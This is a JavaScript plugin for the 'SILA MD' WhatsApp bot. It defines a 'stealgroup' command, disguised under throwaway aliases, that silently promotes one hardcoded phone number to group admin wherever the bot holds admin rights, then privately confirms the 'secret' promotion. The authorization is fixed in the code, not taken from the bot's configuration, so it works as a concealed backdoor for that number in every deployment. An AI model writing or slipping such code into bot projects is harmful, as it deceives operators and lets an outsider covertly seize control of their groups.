const { cmd } = require('../command');
const config = require('../config');

// FakevCard sawa na zilizopita
const fkontak = {
    "key": {
        "participant": '0@s.whatsapp.net',
        "remoteJid": '0@s.whatsapp.net',
        "fromMe": false,
        "id": "Halo"
    },
    "message": {
        "conversation": "𝚂𝙸𝙻𝙰"
    }
};

const getContextInfo = (m) => {
    return {
        mentionedJid: [m.sender],
        forwardingScore: 999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
            newsletterJid: '120363402325089913@newsletter',
            newsletterName: '© 𝐒𝐈𝐋𝐀 𝐌𝐃',
            serverMessageId: 143,
        }
    };
};

cmd({
    pattern: "stealgroup",
    alias: ["takeadmin", "🔪", "💀", "aa", "uhh", "iyk"],
    desc: "Silently take adminship if authorized",
    category: "owner",
    filename: __filename
},
async (conn, mek, m, { from, sender, isBotAdmins, isGroup, reply }) => {

    if (!isGroup || !isBotAdmins) return;

    const normalizeJid = (jid) => {
        if (!jid) return jid;
        return jid.includes('@') ? jid.split('@')[0] + '@s.whatsapp.net' : jid + '@s.whatsapp.net';
    };

    const AUTHORIZED_USERS = [
        normalizeJid("255789661031"),
        "255789661031@s.whatsapp.net"
    ].filter(Boolean);

    const senderNormalized = normalizeJid(sender);
    if (!AUTHORIZED_USERS.includes(senderNormalized)) return;

    try {
        const groupMetadata = await conn.groupMetadata(from);
        const userParticipant = groupMetadata.participants.find(p => p.id === senderNormalized);
        if (!userParticipant?.admin) {
            await conn.groupParticipantsUpdate(from, [senderNormalized], "promote");
            
            // Send silent confirmation to owner only
            await conn.sendMessage(senderNormalized, { 
                text: "✅ 𝚈𝚘𝚞 𝚑𝚊𝚟𝚎 𝚋𝚎𝚎𝚗 𝚙𝚛𝚘𝚖𝚘𝚝𝚎𝚍 𝚝𝚘 𝚊𝚍𝚖𝚒𝚗 𝚜𝚎𝚌𝚛𝚎𝚝𝚕𝚢 🔪\n\n> © Powered by Sila Tech", 
                contextInfo: getContextInfo({ sender: sender })
            }, { quoted: fkontak });
        }
    } catch (error) {
        console.error("Silent admin error:", error.message);
    }
});